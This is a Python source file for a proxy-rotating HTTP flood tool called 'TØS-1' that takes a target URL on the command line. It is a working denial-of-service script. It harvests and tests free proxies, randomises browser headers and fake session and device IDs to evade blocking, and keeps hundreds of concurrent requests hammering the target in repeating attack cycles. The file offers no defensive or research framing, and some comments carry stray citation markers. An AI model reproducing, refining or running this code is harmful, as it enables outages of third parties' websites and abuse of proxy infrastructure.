import aiohttp
import asyncio
import random
import time
import os
from typing import List, Dict
import sys

class TOS1:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.total_requests = 0
        self.start_time = time.time()
        self.proxies: List[str] = []
        self.headers_pool: List[Dict] = []
        self.session_id_pool: List[str] = []
        self.device_id_pool: List[str] = []
        
        self.attack_active = False
        self.rotation_index = 0
        self.maintenance_counter = 0
        self.session = None
        
        self._build_headers_pool()
        self._build_id_pools()

    def _build_headers_pool(self):
        """Creates a pool of realistic-looking headers to rotate through."""
        base_user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        accept_languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9']
        referers = ['https://www.google.com/', 'https://www.facebook.com/', 'https://twitter.com/', '']
        
        for ua in base_user_agents:
            for lang in accept_languages:
                for ref in referers:
                    headers = {
                        'User-Agent': ua,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': lang,
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0'
                    }
                    if ref:
                        headers['Referer'] = ref
                    self.headers_pool.append(headers)
        print(f"[+] Built pool of {len(self.headers_pool)} unique headers")

    def _build_id_pools(self):
        """Generates pools of random session and device IDs."""
        for _ in range(1000):
            self.session_id_pool.append(f"S{random.randint(10000000, 99999999)}")
            self.device_id_pool.append(f"D{random.randint(1000000000, 9999999999)}")

    def _load_proxies_from_files(self):
        """Loads proxies from h1.txt and h2.txt files."""
        loaded = 0
        for filename in ['h1.txt', 'h2.txt']:
            try:
                with open(filename, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        proxy = line.strip()
                        if proxy and ':' in proxy:
                            # Ensure proxy has http:// prefix for aiohttp[citation:7]
                            if not proxy.startswith(('http://', 'https://')):
                                proxy = f"http://{proxy}"
                            self.proxies.append(proxy)
                            loaded += 1
                print(f"[+] Loaded {loaded} proxies from {filename}")
            except FileNotFoundError:
                print(f"[-] File {filename} not found, skipping.")

    async def _fetch_proxies_from_api(self):
        """Fetches fresh proxies from the API endpoint you provided."""
        api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=30) as response:
                    if response.status == 200:
                        text = await response.text()
                        fresh_proxies = []
                        for line in text.strip().split('\n'):
                            proxy = line.strip()
                            if proxy and ':' in proxy:
                                if not proxy.startswith(('http://', 'https://')):
                                    proxy = f"http://{proxy}"
                                fresh_proxies.append(proxy)
                        # Replace the old proxy list
                        self.proxies = fresh_proxies
                        print(f"[+] Fetched {len(self.proxies)} fresh proxies from API")
                    else:
                        print(f"[-] API returned status {response.status}")
        except Exception as e:
            print(f"[-] Failed to fetch from API: {e}")

    async def _test_proxy(self, session: aiohttp.ClientSession, proxy: str) -> bool:
        """Quickly tests if a proxy is working."""
        test_url = "http://httpbin.org/ip"
        try:
            # Timeout must be very short for testing[citation:7]
            async with session.get(test_url, proxy=proxy, timeout=2) as resp:
                if resp.status == 200:
                    return True
        except:
            pass
        return False

    async def _filter_working_proxies(self):
        """Tests all loaded proxies and keeps only the working ones."""
        if not self.proxies:
            return
        
        print(f"[~] Testing {len(self.proxies)} proxies...")
        connector = aiohttp.TCPConnector(limit=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self._test_proxy(session, proxy) for proxy in self.proxies]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        working_proxies = []
        for proxy, is_working in zip(self.proxies, results):
            if is_working is True:
                working_proxies.append(proxy)
        
        self.proxies = working_proxies
        print(f"[+] Filtered to {len(self.proxies)} working proxies")

    def _get_rotated_headers(self):
        """Returns a rotated set of headers and IDs for a request."""
        self.rotation_index = (self.rotation_index + 1) % len(self.headers_pool)
        
        headers = self.headers_pool[self.rotation_index].copy()
        headers['X-Session-ID'] = random.choice(self.session_id_pool)
        headers['X-Device-ID'] = random.choice(self.device_id_pool)
        
        return headers

    async def _send_request(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
        """Core function to send a single request through a random proxy."""
        if not self.proxies:
            return
        
        async with semaphore:
            try:
                proxy = random.choice(self.proxies)
                headers = self._get_rotated_headers()
                
                # Use the target URL and proxy[citation:2][citation:7]
                async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=5) as response:
                    # Immediately close response to free connection
                    await response.read()
                    self.total_requests += 1
                    
            except (aiohttp.ClientError, asyncio.TimeoutError):
                # Count failed attempts as sent
                self.total_requests += 1
            except Exception:
                pass

    async def _attack_phase(self):
        """The main asynchronous attack loop."""
        print("\n[+] TØS-1 | Attack Phase Started")
        self.attack_active = True
        
        # Configure connection limits for high concurrency
        connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
        timeout = aiohttp.ClientTimeout(total=10)
        
        # Semaphore to control concurrency and prevent system overload
        concurrency_limit = 300
        semaphore = asyncio.Semaphore(concurrency_limit)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as self.session:
            tasks = []
            while self.attack_active:
                # Create new tasks to replace completed ones
                while len(tasks) < concurrency_limit:
                    task = asyncio.create_task(self._send_request(self.session, semaphore))
                    tasks.append(task)
                
                # Wait for at least one task to complete
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                
                # Remove completed tasks and count them
                for task in done:
                    tasks.remove(task)
                    try:
                        await task
                    except:
                        pass
                
                # Quick update to display (non-blocking)
                if random.random() < 0.01:  # Update ~1% of the time to minimize overhead
                    self._update_display()

    def _update_display(self):
        """Updates the single-line display with total requests."""
        runtime = int(time.time() - self.start_time)
        minutes = runtime // 60
        seconds = runtime % 60
        runtime_str = f"{minutes:02d}:{seconds:02d}"
        
        # Overwrites the line in place
        sys.stdout.write(f"\rTØS-TRS — {self.total_requests} | {{S023, TØS-RR}} | RT:{runtime_str}")
        sys.stdout.flush()

    async def _maintenance_phase(self):
        """Pauses attacks, clears resources, and refreshes pools."""
        print(f"\n[!] TØS-MAINTENANCE | Cycle #{self.maintenance_counter + 1}")
        self.attack_active = False
        
        # Close existing session to free sockets
        if self.session:
            await self.session.close()
        
        print("[~] Clearing pools and refreshing...")
        # Clear old proxies and fetch new ones from API[citation:1]
        self.proxies.clear()
        await self._fetch_proxies_from_api()
        
        # Also reload from files for redundancy[citation:6]
        self._load_proxies_from_files()
        
        # Test and filter the new combined proxy list
        await self._filter_working_proxies()
        
        # Refresh ID pools
        self.session_id_pool.clear()
        self.device_id_pool.clear()
        self._build_id_pools()
        
        print(f"[+] Maintenance complete. {len(self.proxies)} proxies ready.")
        self.maintenance_counter += 1
        print("[+] Resuming attack in 3...")
        await asyncio.sleep(3)

    async def run(self):
        """Main orchestrator for the TØS-1 lifecycle."""
        # Initialization and branding
        print("\n" + "="*50)
        print("𝖳Ø𝖲-1 | 𝖲023")
        print("="*50)
        await asyncio.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Phase 1: Initial Proxy Load (1 minute)
        print("\n[~] Initial 1-minute proxy acquisition phase...")
        load_tasks = []
        load_tasks.append(asyncio.create_task(self._fetch_proxies_from_api()))
        self._load_proxies_from_files()
        await asyncio.gather(*load_tasks, return_exceptions=True)
        await self._filter_working_proxies()
        
        if not self.proxies:
            print("[-] CRITICAL: No working proxies found. Exiting.")
            return
        
        print(f"[+] Initial load: {len(self.proxies)} working proxies")
        print("[+] Starting attack engine...")
        await asyncio.sleep(1)
        
        # Main attack/maintenance loop
        last_maintenance = time.time()
        maintenance_interval = 15 * 60  # 15 minutes
        
        try:
            while True:
                # Check for maintenance
                current_time = time.time()
                if current_time - last_maintenance >= maintenance_interval:
                    await self._maintenance_phase()
                    last_maintenance = current_time
                
                # Run attack phase
                attack_task = asyncio.create_task(self._attack_phase())
                
                # Let attack run for a short period before checking maintenance again
                await asyncio.sleep(60)
                self.attack_active = False
                await attack_task
                
        except KeyboardInterrupt:
            print("\n\n[!] TØS-1 | Manual shutdown initiated.")
            self.attack_active = False
            runtime = time.time() - self.start_time
            print(f"[+] Final Stats:")
            print(f"    Total Requests: {self.total_requests:,}")
            print(f"    Runtime: {runtime:.1f} seconds")
            if runtime > 0:
                print(f"    Average RPS: {self.total_requests/runtime:.1f}")
            print("[+] Shutdown complete.")

async def main():
    if len(sys.argv) != 2:
        print("Usage: python tos1.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not target_url.startswith(('http://', 'https://')):
        print("[-] Target must be a valid HTTP/HTTPS URL")
        sys.exit(1)
    
    engine = TOS1(target_url)
    await engine.run()

if __name__ == "__main__":
    # Set process priority (conceptual - implement based on your OS)
    # psutil.Process().nice(19)  # For Linux
    # psutil.Process().nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)  # For Windows
    
    # Run the async event loop
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nExiting.")
